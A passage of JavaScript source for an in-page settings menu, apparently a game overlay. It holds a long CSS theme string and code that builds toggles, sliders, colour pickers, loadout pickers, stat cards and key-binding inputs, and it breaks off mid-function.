transform: translateX(22px); background: #B987FF; } .z-select-wrapper { position: relative; width: 160px; font-size: 14px; user-select: none; } .z-select-display { padding: 8px 36px 8px 12px; background: linear-gradient(145deg,#1a1a1a,#111); border: 1px solid rgba(155,92,255,0.25); border-radius: 12px; color: #E6E6E6; cursor: pointer; position: relative; transition: all 0.25s ease, box-shadow 0.3s ease; box-shadow: inset 0 1px 2px rgba(255,255,255,0.05); } .z-select-display:hover { border-color: #9B5CFF; background: linear-gradient(145deg,#222,#0f0f0f); } .z-select-wrapper.open .z-select-display { border-color: #9B5CFF; box-shadow: 0 0 8px rgba(155,92,255,0.35), inset 0 1px 2px rgba(255,255,255,0.05); } .z-select-display::after { content: "<"; position: absolute; top: 50%; right: 12px; transform: translateY(-50%) rotate(0deg); color: #9B5CFF; font-size: 12px; transition: transform 0.3s ease, color 0.25s ease; } .z-select-wrapper.open .z-select-display::after { transform: translateY(-50%) rotate(-90deg); color: #B987FF; } .z-select-dropdown { position: absolute; top: calc(100% + 6px); left: 0; width: 100%; background: linear-gradient(145deg,#121212,#1a1a1a); border: 1px solid rgba(155,92,255,0.25); border-radius: 10px; overflow-y:auto; max-height: 0; opacity: 0; pointer-events: none; transition: max-height 0.35s cubic-bezier(0.4,0,0.2,1), opacity 0.3s ease, box-shadow 0.25s ease; z-index: 1000; box-shadow: 0 6px 16px rgba(0,0,0,0.6), inset 0 1px 4px rgba(255,255,255,0.05); } .z-select-wrapper.open .z-select-dropdown { max-height: 220px; opacity: 1; pointer-events: auto; } .z-select-option { padding: 10px 14px; color: #E0E0E0; cursor: pointer; transition: all 0.2s ease; border-left: 3px solid transparent; border-radius: 6px; } .z-select-option:hover { background: rgba(155,92,255,0.08); color: #B987FF; border-left: 3px solid #B987FF; padding-left: 11px; } .z-select-dropdown::-webkit-scrollbar { width: 6px; } .z-select-dropdown::-webkit-scrollbar-thumb { background: rgba(155,92,255,0.35); border-radius: 3px; } .z-select-dropdown::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 3px; } .z-select-option.is-on { background: rgba(142,204,81,0.08); color: #8ecc51; border-left-color: rgba(142,204,81,0.55); } .z-select-option.current { background: rgba(155,92,255,0.10); color: #EDE7FF; border-left-color: rgba(155,92,255,0.60); } .z-select-option.current:hover { background: rgba(155,92,255,0.18); } .z-select-option.is-on.current { background: rgba(155,92,255,0.18); color: #F2EDFF; border-left-color: rgba(142,204,81,0.95); box-shadow: inset 0 0 0 1px rgba(155,92,255,0.22), 0 0 0 1px rgba(142,204,81,0.10); } .z-select-option.is-on.current:hover { background: rgba(155,92,255,0.20); } .z-select-option.selected { background: rgba(155,92,255,0.14); color: #EDE3FF; border-left: 3px solid #9B5CFF; padding-left: 11px; box-shadow: inset 0 0 10px rgba(155,92,255,0.18); } .z-select-option.selected:hover { background: rgba(155,92,255,0.18); } .z-slider { -webkit-appearance: none; width: 160px; height: 8px; border-radius: 6px; background: linear-gradient(180deg,#1c1f22,#111315); border: 1px solid rgba(255,255,255,0.12); box-shadow: inset 0 1px 2px rgba(0,0,0,0.8), inset 0 -1px 0 rgba(255,255,255,0.05); cursor: pointer; flex-shrink: 0; } .z-slider::-webkit-slider-runnable-track { height: 8px; border-radius: 6px; } .z-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; margin-top: -6px; border-radius: 50%; background: linear-gradient(180deg,#B987FF,#5B1AE6); border: 1px solid rgba(255,255,255,0.35); box-shadow: 0 2px 6px rgba(155,92,255,0.45), inset 0 1px 0 rgba(255,255,255,0.5); transition: transform .15s ease; } .z-slider:active::-webkit-slider-thumb { transform: scale(1.1); } .z-slider::-moz-range-thumb { width: 18px; height: 18px; border-radius: 50%; background: linear-gradient(180deg,#B987FF,#5B1AE6); border: 1px solid rgba(255,255,255,0.35); } .z-slider-value { min-width: 28px; text-align: right; font-size: 13px; color: rgba(255,255,255,0.85); } .z-color { position: relative; width: 52px; height: 30px; border-radius: 8px; background:#141414; border:1px solid rgba(255,255,255,0.12); cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,0.4); } .z-color-preview { width:100%; height:100%; border-radius:6px; background:#00BFFF; transition: background 0.35s ease; } .z-color-popup { position:absolute; right:0; top:36px; padding:10px; border-radius:12px; background:#0f0f0f; border:1px solid rgba(255,255,255,0.08); box-shadow:0 10px 24px rgba(0,0,0,0.7); display:none; z-index:10000; } .z-color.open .z-color-popup { display:block; } .z-sv-wrap { position: relative; width: 160px; height: 120px; border-radius: 6px; overflow: hidden; } .z-sv { display: block; width: 160px; height: 120px; margin: 0; padding: 0; border: 0; border-radius: 6px; cursor: crosshair; box-shadow: inset 0 0 3px rgba(0,0,0,.5); } .z-sv-cursor { position: absolute; width: 12px; height: 12px; left: 0; top: 0; border: 2px solid #fff; border-radius: 50%; pointer-events: none; transform: translate(-6px,-6px); box-shadow: 0 0 6px rgba(0,0,0,.8), 0 0 6px rgba(255,255,255,.4); background: radial-gradient(circle at center, rgba(255,255,255,.9) 0%, rgba(255,255,255,.3) 40%, rgba(255,255,255,0) 70%); z-index: 2; } .z-sv-cursor::after { content: ""; position: absolute; left: 50%; top: 50%; width: 20px; height: 20px; border: 1px solid rgba(255,255,255,.25); border-radius: 50%; transform: translate(-50%,-50%); } .z-hue { width:160px; height:8px; border-radius:6px; background: linear-gradient(to right, red, yellow, lime, cyan, blue, magenta, red); cursor:pointer; -webkit-appearance:none; margin-bottom:6px; } .z-hue::-webkit-slider-thumb { -webkit-appearance:none; width:14px;height:14px;border-radius:50%;background:#00BFFF; border:2px solid #fff; cursor:pointer; margin-top:-2px; box-shadow:0 0 3px rgba(0,0,0,0.5); } .z-color-inputs { display:flex; gap:6px; align-items:center; } .z-input { flex:1; padding:2px 4px; font-size:11px; border-radius:6px; border:none; background:#1c1c1c; color:#e0e0e0; text-align:center; max-width:70px; } .z-mode-toggle { width:40px; text-align:center; font-size:11px; color:#00BFFF; cursor:pointer; user-select:none; padding:2px 4px; border-radius:6px; background: rgba(0,191,255,0.1); transition: background 0.35s ease; } .z-mode-toggle:hover { background: rgba(0,191,255,0.2); } .z-submenu-btn { width: 30px; height: 30px; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; user-select: none; border: 0 !important; overflow: hidden; background: rgba(155,92,255,.10); color: #B987FF; box-shadow: inset 0 0 0 2px rgba(155,92,255,.35), 0 4px 10px rgba(0,0,0,.30); transition: background .22s ease, box-shadow .22s ease, transform .08s ease, filter .18s ease; transform: translateZ(0); } .z-submenu-btn:hover { background: rgba(155,92,255,.16); box-shadow: inset 0 0 0 2px rgba(155,92,255,.65), 0 8px 18px rgba(0,0,0,.45); filter: brightness(1.08); } .z-submenu-btn:active { box-shadow: inset 0 0 0 2px rgba(155,92,255,.75), 0 2px 6px rgba(0,0,0,.25); transform: translateY(1px); } .z-submenu-btn i { margin: 0 !important; width: auto !important; height: auto !important; border: 0 !important; background: transparent !important; box-shadow: none !important; border-radius: 0 !important; color: inherit !important; font-size: 18px !important; line-height: 1 !important; display: block !important; } .z-submenu-container { display: flex; flex-direction: column; max-height: 0; overflow: hidden; margin: 0; padding: 0 14px; background: rgba(35,35,35,0.95); border-radius: 14px; border: 1px solid rgba(155,92,255,0.25); opacity: 0; transition: max-height 0.35s ease, padding 0.35s ease, margin 0.35s ease, opacity 0.3s ease; } .z-submenu-container.open { display: flex; max-height: 9999px; padding: 14px; margin: 10px 0 20px 0; opacity: 1; position: relative; z-index: 20; overflow: visible; } .z-submenu-container .z-option { display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; border-radius: 12px; background: rgba(30,30,30,0.9); transition: background 0.25s, transform 0.2s; margin-bottom: 10px; } .z-submenu-container .z-option:last-child { margin-bottom: 0; } .z-submenu-container .z-option:hover { background: rgba(155,92,255,0.1); } .z-submenu-container .z-option i { font-size: 20px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; margin-right: 12px; color: #9B5CFF; border-radius: 6px; background: linear-gradient(145deg,#1c1c1c,#0f0f0f); border: 2px solid rgba(155,92,255,0.3); flex-shrink: 0; } .z-submenu-container .z-option-text { display: flex; flex-direction: column; flex: 1; } .z-submenu-container .z-option-title { font-size: 14px; font-weight: 600; color: #E0E0E0; } .z-submenu-container .z-sec-title { font-size: 12px;} .z-submenu-container .z-option-desc { font-size: 11px; color: rgba(255,255,255,0.6); white-space: nowrap; text-overflow: ellipsis; overflow: hidden; } .z-submenu-btn:focus, .z-submenu-btn:focus-visible { outline: none !important; box-shadow: none !important; } .z-loadout-display { display:flex; align-items:center; gap:10px; padding:8px 10px; min-width:170px; border-radius:12px; background:linear-gradient(145deg,#1a1a1a,#111); border:1px solid rgba(155,92,255,.25); cursor:pointer; transition:background .25s,border-color .25s,box-shadow .25s; box-sizing:border-box; } .z-loadout-display:hover { background:linear-gradient(145deg,#222,#0f0f0f); border-color:#9B5CFF; box-shadow:0 0 8px rgba(155,92,255,.25); } .z-loadout-mini { width:26px; height:26px; image-rendering:pixelated; filter:drop-shadow(0 2px 3px rgba(0,0,0,.6)); flex-shrink:0; } .z-loadout-name { font-size:12px; font-weight:800; color:rgba(255,255,255,.85); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:120px; } .z-loadout-modal { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,.45); opacity:0; pointer-events:none; transition:opacity .35s; z-index:100000; padding:12px; box-sizing:border-box; } .z-loadout-modal.open { opacity:1; pointer-events:auto; } .z-loadout-panel { width:min(520px,92vw); max-height:74vh; display:flex; flex-direction:column; border-radius:16px; background:linear-gradient(180deg,#121212,#0c0c0c); border:1px solid rgba(255,255,255,.08); box-shadow:0 22px 50px rgba(0,0,0,.85); overflow:hidden; box-sizing:border-box; opacity:0; transform:translateY(16px); transition:opacity .35s,transform .45s cubic-bezier(.4,0,.2,1); } .z-loadout-modal.open .z-loadout-panel { opacity:1; transform:translateY(0); } .z-loadout-top { position:sticky; top:0; z-index:2; display:flex; align-items:center; justify-content:space-between; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,.08); background:rgba(15,15,15,.96); box-sizing:border-box; } .z-loadout-title { font-size:14px; font-weight:900; color:#9B5CFF; text-shadow:0 0 6px rgba(155,92,255,.55); letter-spacing:.2px; } .z-loadout-close { font-size:22px; line-height:1; cursor:pointer; opacity:.75; transition:opacity .2s,transform .2s; color:rgba(255,255,255,.85); padding:0 2px; } .z-loadout-close:hover { opacity:1; transform:scale(1.15); } .z-loadout-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(78px,1fr)); gap:8px; padding:10px; flex:1; min-height:0; overflow-y:auto; overflow-x:hidden; align-content:start; box-sizing:border-box; opacity:0; transform:translateY(6px); transition:opacity .45s ease .05s,transform .55s cubic-bezier(.4,0,.2,1) .05s; } .z-loadout-modal.open .z-loadout-grid { opacity:1; transform:translateY(0); } .z-loadout-card { position:relative; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:8px; border-radius:12px; background:rgba(30,30,30,.85); border:1px solid rgba(255,255,255,.08); cursor:pointer; transition:background .25s,border-color .25s,box-shadow .25s,transform .35s; box-sizing:border-box; } .z-loadout-card:hover { background:rgba(155,92,255,.08); border-color:rgba(155,92,255,.35); transform:translateY(-2px); } .z-loadout-card.active { background:rgba(155,92,255,.16); border-color:#9B5CFF; box-shadow:inset 0 0 12px rgba(155,92,255,.22); } .z-loadout-img { width:42px; height:42px; image-rendering:pixelated; filter:drop-shadow(0 2px 3px rgba(0,0,0,.7)); } .z-loadout-tag { margin-top:5px; font-size:10px; font-weight:800; color:rgba(255,255,255,.7); text-align:center; max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; } .z-loadout-grid::-webkit-scrollbar { width: 6px; } .z-loadout-grid::-webkit-scrollbar-track { background: transparent; } .z-loadout-grid::-webkit-scrollbar-thumb { background: rgba(155, 92, 255, 0.45); border-radius: 10px; } .z-loadout-grid::-webkit-scrollbar-thumb:hover { background: rgba(185, 135, 255, 0.75); } .z-loadout-grid { scrollbar-width: thin; scrollbar-color: rgba(155, 92, 255, 0.45) transparent; } .z-inputbox { width: 110px; height: 28px; padding: 0 8px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.12); background: rgba(18,18,18,0.9); color: rgba(255,255,255,0.9); font-weight: 800; font-size: 12px; outline: none; box-sizing: border-box; text-align: right; font-variant-numeric: tabular-nums; } .z-inputbox:focus { border-color: rgba(155,92,255,0.55); box-shadow: 0 0 0 3px rgba(155,92,255,0.10); } .z-inputbox.key-listen { border-color:#9B5CFF; box-shadow: 0 0 0 3px rgba(155,92,255,0.14); } .z-inputbox[type="number"]::-webkit-outer-spin-button, .z-inputbox[type="number"]::-webkit-inner-spin-button { -webkit-appearance:none; margin:0; } .z-inputbox[type="number"]{ width: 62px; max-width: 62px; font-size: 13px; } .z-perf-card { position:relative; padding:14px; border-radius:16px; background:rgba(30,30,30,.85); border:1px solid rgba(255,255,255,.08); box-shadow:0 2px 8px rgba(0,0,0,.35); overflow:hidden; width:100%; box-sizing:border-box; margin-bottom:12px; } .z-perf-card::before { content:""; position:absolute; inset:0; background:radial-gradient(600px 180px at -10% -20%, rgba(155,92,255,.18), transparent 55%); pointer-events:none; } .z-perf-head { display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom:10px; position:relative; z-index:1; } .z-perf-left { display:flex; align-items:center; gap:10px; } .z-perf-ico { width:38px; height:38px; border-radius:12px; display:flex; align-items:center; justify-content:center; background:linear-gradient(145deg,#1a1a1a,#111); border:2px solid rgba(155,92,255,.28); color:#9B5CFF; box-shadow:inset 0 0 10px rgba(155,92,255,.12); } .z-perf-name { font-size:13px; font-weight:900; color:rgba(255,255,255,.86); } .z-perf-meta { display:flex; gap:10px; font-size:12px; color:rgba(255,255,255,.65); font-weight:800; white-space:nowrap; } .z-perf-meta b { color:rgba(255,255,255,.92); } .z-perf-canvas { width:100%; height:110px; display:block; border-radius:12px; background:rgba(12,12,12,.85); border:1px solid rgba(255,255,255,.06); box-shadow:inset 0 0 0 1px rgba(0,0,0,.35); position:relative; z-index:1; image-rendering:crisp-edges; } .z-perf-foot { margin-top:8px; font-size:11px; color:rgba(255,255,255,.55); position:relative; z-index:1; display:flex; justify-content:space-between; } .z-perf-foot span:last-child { font-weight:700; } .z-perf-break { clear:both; height:0; display:block; } .z-stat { position:relative; padding:14px 14px 12px; border-radius:16px; background: rgba(30,30,30,0.85); border:1px solid rgba(255,255,255,0.08); box-shadow: 0 2px 8px rgba(0,0,0,0.35); overflow:hidden; } .z-stat::before { content:""; position:absolute; inset:0; background: radial-gradient(600px 180px at -10% -20%, rgba(155,92,255,0.20), transparent 55%); pointer-events:none; } .z-stat-top { display:flex; align-items:center; gap:10px; margin-bottom:10px; } .z-stat-ico { width:38px; height:38px; border-radius:12px; display:flex; align-items:center; justify-content:center; background: linear-gradient(145deg,#1a1a1a,#111); border: 2px solid rgba(155,92,255,0.28); color:#9B5CFF; box-shadow: inset 0 0 10px rgba(155,92,255,0.12); } .z-stat-name { font-size:13px; font-weight:800; color: rgba(255,255,255,.82); } .z-stat-row { display:flex; align-items:baseline; justify-content:space-between; gap:10px; } .z-stat-big { font-size:22px; font-weight:900; color:#FFFFFF; line-height:1; } .z-stat-total { font-size:12px; color: rgba(255,255,255,.55); font-weight:700; } .z-stat-total b { color: rgba(255,255,255,.85); font-weight:900; } .z-stat-foot { margin-top:10px; height:6px; border-radius:999px; background: rgba(255,255,255,0.06); overflow:hidden; } .z-stat-bar { height:100%; width:0%; background: linear-gradient(90deg, rgba(155,92,255,0.25), rgba(155,92,255,0.75)); border-radius:999px; box-shadow: 0 0 10px rgba(155,92,255,0.35); } .z-stat-break { clear:both; height:0; display:block; } .z-stat.is-playtime #PlaytimeStat-totalWrap { display:flex; align-items:center; justify-content:flex-end; gap:6px; white-space:nowrap; } .z-stat.is-playtime #PlaytimeStat-total { display:inline; font-size:11px; font-weight:900; line-height:1; max-width: 76px; overflow:hidden; text-overflow:ellipsis; }`,
  },

  Menu: {
    visible: false,
    MenuKey: "`",
    menu: null,
    tabs: null,
    pages: null,
    closeBtn: null,
    searchInput: null,
    storeKey: "zmenu.settings.v1",
    autoKey: "zmenu.autosave",
    autoSave: true,
    _saveKeys: null,
    _defaults: null,
    _flatOpts: null,
    _subMem: new Set(),
    generateUI(options, pageId) {
      const iconMap = {
        checkbox: "check_box",
        slider: "tune",
        Input: "keyboard",
        Colors: "palette",
        selector: "list",
        Loadout: "checkroom",
        SelecBox: "toggle_on",
        Graph: "show_chart",
        Stat: "insights",
        text: "info",
        Header: "title",
        button: "touch_app",
      },
        getIcon = (type) => iconMap[type] || "settings";
      const createElement = ({
        type,
        id,
        title,
        onChange,
        description,
        suboptions,
        icon,
      }) => {
        const hasSub = suboptions && suboptions.length > 0;
        const subBtn = hasSub
          ? `<button class="z-submenu-btn" type="button"> <i class="material-icons">tune</i></button>`
          : "";
        const rightWrap = (inner) =>
          `<div style="display:flex;align-items:center;gap:8px">${subBtn}${inner || ""}</div>`;
        const elements = {
          Header: `<div class="z-sec-title">${title}</div>`,
          text: `<div class="z-option" data-type="text" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${hasSub ? rightWrap("") : ""}</div>`,
          checkbox: `<div class="z-option" data-type="checkbox" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(`<div class="z-checkbox ${(onChange?.[0]?.[1] ?? false) ? "active" : ""}" id="${id}" data-value="${onChange?.[0]?.[1] ?? false}"></div>`)}</div>`,
          slider: `<div class="z-option" data-type="slider" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(`<input type="range" class="z-slider" id="${id}"min="${onChange?.[0]?.[2]?.[0] ?? 0}"max="${onChange?.[0]?.[2]?.[1] ?? 100}"value="${onChange?.[0]?.[1] ?? 0}"step="${onChange?.[0]?.[3] ?? 1}"><div class="z-slider-value" id="${id}Value">${onChange?.[0]?.[1] ?? 0}</div>`)}</div>`,
          Input: `<div class="z-option" data-type="Input" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(`<input class="z-inputbox" id="${id}"type="${onChange?.[0]?.[2]?.kind === "number" ? "number" : "text"}"value="${onChange?.[0]?.[1] ?? ""}"placeholder="${onChange?.[0]?.[2]?.placeholder || ""}"${onChange?.[0]?.[2]?.maxLen ? `maxlength="${onChange[0][2].maxLen}"` : ""}${onChange?.[0]?.[2]?.kind === "number" ? `min="${onChange[0][2].min ?? ""}" max="${onChange[0][2].max ?? ""}" step="${onChange[0][2].step ?? 1}"` : ""}autocomplete="off" spellcheck="false"/>`)}</div>`,
          selector: `<div class="z-option" data-type="selector" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(`<div class="z-select-wrapper" id="${id}"><div class="z-select-display" id="${id}Value">${onChange?.[0]?.[1] ?? ""}</div><div class="z-select-dropdown" id="${id}Options">${(Array.isArray(onChange?.[0]?.[2]) ? onChange[0][2] : onChange?.[0]?.[2] != null ? [onChange[0][2]] : []).map((opt) => `<div class="z-select-option" data-value="${opt}">${opt}</div>`).join("")}</div></div>`)}</div>`,
          Colors: `<div class="z-option" data-type="Colors" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(`<div class="z-color" id="${id}" data-setting="${id}"><div class="z-color-preview" style="background:${onChange?.[0]?.[1] || "#ffffff"}"></div><div class="z-color-popup"><div class="z-sv-wrap"><canvas class="z-sv" width="160" height="120"></canvas></div><input class="z-hue" type="range" min="0" max="360" value="200"><div class="z-color-inputs"><input class="z-input" type="text" value="${onChange?.[0]?.[1] || "#ffffff"}"><div class="z-mode-toggle">HEX</div></div></div></div>`)}</div>`,
          Loadout: `<div class="z-option" data-type="Loadout" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(`<div class="z-loadout-display" id="${id}" data-setting="${id}"><img class="z-loadout-mini" src="${onChange?.[0]?.[1]?.img || onChange?.[0]?.[1]}"><span class="z-loadout-name" id="${id}Name">${onChange?.[0]?.[2]?.name || onChange?.[0]?.[2]}</span></div>`)}</div>`,
          SelecBox: `<div class="z-option" id="${id}" data-type="SelecBox" data-setting="${id}"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div>${rightWrap(
            `<div style="display:flex;align-items:center;gap:10px"><div class="z-checkbox" id="${id}-chk"></div><div class="z-select-wrapper" id="${id}-sel"><div class="z-select-display" id="${id}-selValue"></div><div class="z-select-dropdown" id="${id}-selOptions">${(Array.isArray(
              onChange?.[0],
            )
              ? onChange[0]
              : []
            )
              .filter((x) => Array.isArray(x))
              .map(
                ([name]) =>
                  `<div class="z-select-option" data-value="${name}">${name}</div>`,
              )
              .join("")}</div></div></div>`,
          )}</div>`,
          Graph: `<div class="z-perf-card" data-type="Graph" data-setting="${id}" id="${id}"><div class="z-perf-head"><div class="z-perf-left"><div class="z-perf-ico"><i class="material-icons">${icon || getIcon(type)}</i></div><div class="z-perf-name" id="${id}-name">${title || ""}</div></div><div class="z-perf-meta"><span>Avg <b id="${id}-avg">0</b></span><span>Low <b id="${id}-min">0</b></span><span>High <b id="${id}-max">0</b></span></div></div><canvas class="z-perf-canvas" id="${id}-canvas" width="560" height="120"></canvas><div class="z-perf-foot"><span id="${id}-range">Last ~60s</span><span><b id="${id}-now">0</b></span></div></div>`,
          Stat: `<div class="z-stat" id="${id}" data-stat="${id}"><div class="z-stat-top"><div class="z-stat-ico"><i class="material-icons">${icon || getIcon(type)}</i></div><div class="z-stat-name">${title || id}</div></div><div class="z-stat-row"><div class="z-stat-big" id="${id}-val">0</div><div class="z-stat-total" id="${id}-totalWrap">Total: <b id="${id}-total">0</b></div></div><div class="z-stat-foot"><div class="z-stat-bar" id="${id}-bar"></div></div></div>`,
          button: `<div class="z-option z-btn-option" data-type="button" data-setting="${id}" id="${id}" style="cursor:pointer;"><i class="material-icons">${icon || getIcon(type)}</i><div class="z-option-text"><div class="z-option-title" id="${id}title">${title}</div><div class="z-option-desc">${description || ""}</div></div></div>`,
          submenu: hasSub
            ? `<div class="z-submenu-container" id="${id}-sub">${suboptions.map(createElement).join("")}</div>`
            : "",
        };

        return (elements[type] || "") + (elements.submenu || "");
      };
      const optionsHTML = options.map(createElement).join("");
      return optionsHTML;
    },
    Notify(onChange, title, format) {
      if (!onChange?.[1]) return () => { };
      const [n, l] = Array.isArray(onChange[1])
        ? onChange[1]
        : [onChange[1], onChange[1]];
      return (value, label = title) => {
        if (this._silent) return;
        const lab = typeof label === "function" ? label(value) : label;
        const v = format ? format(value) : value;
        const isBool = typeof value === "boolean";
        const text = isBool ? (value ? "ON" : "OFF") : (v ?? "—");
        if (n)
          AB.NotiDisplay.add(
            `${lab}: ${text}`,
            isBool ? (value ? "#9B5CFF" : "#ff4d4d") : "#B987FF",
          );
        if (l) console.log(`${lab}: ${text}`);
      };
    },
    initOptionHandlers(options, pageId) {
      const container = document.getElementById(`page-${pageId}`);
      if (!container) return;
      const flatten = (opts) =>
        opts.reduce(
          (a, b) => [...a, b, ...(b.suboptions ? flatten(b.suboptions) : [])],
          [],
        ),
        allOpts = flatten(options);

      allOpts.forEach(({ type, id, onChange, title, suboptions }) => {
        if (type === "Header" || (type === "text" && !onChange)) return;
        const el = container.querySelector(`#${id}`),
          valDisp = container.querySelector(`#${id}Value`);

        if (!el || !onChange) return;

        const save = () => this.queueSave();
        this.keyCombo ||= (e) => {
          const k = e?.key || "";
          if (!k) return "";
          if (/^F\d{1,2}$/.test(k)) return "";
          const mods = [];
          if (e.ctrlKey) mods.push("Ctrl");
          if (e.altKey) mods.push("Alt");
          if (e.shiftKey) mods.push("Shift");
          if (e.metaKey) mods.push("Meta");
          return (mods.length ? mods.join("+") + "+" : "") + k;
        };
        const handlers = {
          checkbox: () => {
            el.onfocus = () => el.blur();
            const [idKey, defVal = false] = Array.isArray(onChange?.[0])
              ? [onChange[0][0], onChange[0][1] ?? false]
              : [onChange?.[0], false],
              k = `__${idKey}`;
            if (this[k] === undefined) this[k] = this[idKey] ?? defVal;
            const sync = (c) =>
              el &&
              (el.classList.toggle("active", c), (el.dataset.value = c)),
              notify = this.Notify(onChange, title, (c) => (c ? "ON" : "OFF"));
            Object.defineProperty(this, idKey, {
              get: () => this[k],
              set: (v) => ((this[k] = v), sync(v), notify(v)),
              configurable: true,
            });
            sync(this[idKey]);
            el.onclick = () => {
              const c = !el.classList.contains("active");
              this[idKey] !== c && (this[idKey] = c);
            };
          },
          Input: () => {
            const cfg = Array.isArray(onChange?.[0]) ? onChange[0] : [],
              [idKey, defVal = "", metaRaw] = cfg,
              meta = metaRaw && typeof metaRaw === "object" ? metaRaw : {};
            if (!idKey) return;
            const kind = meta.kind || "text",
              [n, l] = Array.isArray(onChange?.[1])
                ? onChange[1]
                : [onChange?.[1], onChange?.[1]],
              notify = this.Notify(onChange, title),
              log = (v) => notify(v),
              clamp = (v, a, b) => Math.min(b, Math.max(a, v)),
              same = (a, b) => String(a ?? "") === String(b ?? ""),
              rnd = (a) => a[(Math.random() * a.length) | 0];
            this[idKey] ??= defVal;
            const canonKey = (v) => {
              v = v == null ? "" : String(v);
              if (/^F\d{1,2}$/.test(v)) return v;
              if (/^Arrow(Up|Down|Left|Right)$/.test(v)) return v;
              const s = v.toLowerCase();
              if (s === "space") return " ";
              if (s === "esc" || s === "escape") return "Escape";
              if (s === "up") return "ArrowUp";
              if (s === "down") return "ArrowDown";
              if (s === "left") return "ArrowLeft";
              if (s === "right") return "ArrowRight";
              if (/^f\d{1,2}$/.test(s)) return "F" + s.slice(1);
              if (s === "shift") return "Shift";
              if (s === "ctrl" || s === "control") return "Control";
              if (s === "alt") return "Alt";
              if (s === "capslock") return "CapsLock";
              if (v.length === 1) return v;
              return v;
            };
            const KEYS = [
              ..."abcdefghijklmnopqrstuvwxyz0123456789",
              ..."-=[]\\;',./",
            ]
              .concat([
                " ",
                "Tab",
                "Enter",
                "Backspace",
                "Delete",
                "Insert",
                "Home",
                "End",
                "PageUp",
                "PageDown",
              ])
              .concat(["Up", "Down", "Left", "Right"])
              .concat(["Shift", "Control", "Alt", "CapsLock"]);
            const randKey = (_) => KEYS[(Math.random() * KEYS.length) | 0];
            const WORDS = {
              adj: "silent crimson frozen rapid ancient silver wicked golden lunar toxic brave feral dark bright swift cosmic rogue wild sharp hollow radiant stormy prime deep heavy nimble arcane solar electric velvet savage neon icy dusty molten astral phantom iron amber brutal fierce blazing cursed sacred divine royal shadowed grim vivid lucid chaotic orderly primal ethereal spectral voided glowing blessed raging steel drifting broken lethal noble mystic umbral chromatic twisted corrupted purified forgotten eternal fleeting apex".split(
                " ",
              ),
              noun: "shadow ember storm viper phantom nova glacier cipher echo raven atlas drift venom pulse halo blade frost titan mystic thorn specter orbit comet zephyr inferno delta cosmos relic onyx reaper warden havoc aurora prism vortex shard seeker falcon wolf serpent dragon phoenix leviathan sentinel guardian striker hunter stalker reaver knight assassin oracle prophet behemoth colossus wraith revenant shade crown throne spire sigil core nexus rift void abyss horizon catalyst spark flare engine forge anvil omen".split(
                " ",
              ),
              adv: "quickly silently boldly smoothly wildly brightly softly roughly secretly bravely calmly madly neatly rarely often always never slowly firmly eagerly loosely closely fiercely quietly gently loudly sharply coldly warmly violently patiently suddenly steadily endlessly briefly constantly repeatedly recklessly carefully precisely harshly eerily faintly proudly humbly blindly wisely cleverly foolishly lazily viciously brutally".split(
                " ",
              ),
            };
            const buildRandomText = (maxLen) => {
              maxLen = Math.max(1, maxLen | 0 || 15);
              const make = (pat) => pat.map((k) => rnd(WORDS[k])).join(" ");
              let out = make(["adv", "adj", "noun"]);
              if (out.length > maxLen) out = make(["adj", "noun"]);
              if (out.length > maxLen) out = make(["noun"]);
              return out.slice(0, maxLen);
            };
            const setVal = (v, notify = true) => {
              if (kind === "number") {
                let num = +v;
                if (Number.isNaN(num)) num = +defVal || 0;
                const min = meta.min != null ? +meta.min : -Infinity,
                  max = meta.max != null ? +meta.max : Infinity,
                  step = +meta.step || 1;
                num = clamp(num, min, max);
                num = Math.round(num / step) * step;
                num = clamp(num, min, max);
                this[idKey] = num;
                el.value = "" + num;
                notify && log(num);
                save();
                return;
              }
              if (kind === "key") {
                v = canonKey(v);
                this[idKey] = v;
                el.value = prettyKey(v);
                notify && log(prettyKey(v));
                save();
                return;
              }
              v = String(v ?? "");
              if (meta.maxLen) v = v.slice(0, meta.maxLen);
              this[idKey] = v;
              el.value = v;
              notify && log(v);
              save();
            };
            el.value = this[idKey] ?? defVal;
            el.addEventListener("contextmenu", (e) => {
              e.preventDefault();
              if (kind === "key" && el._listening) return;
              if (!same(this[idKey], defVal)) setVal(defVal);
            });
            const prettyKey = (k) => {
              if (!k) return "";
              if (String(k).includes("+"))
                return String(k).split("+").map(prettyKey).join("+");
              if (k === " ") return "Space";
              if (k.startsWith("Arrow")) return k.slice(5);
              if (k.length === 1) return k;
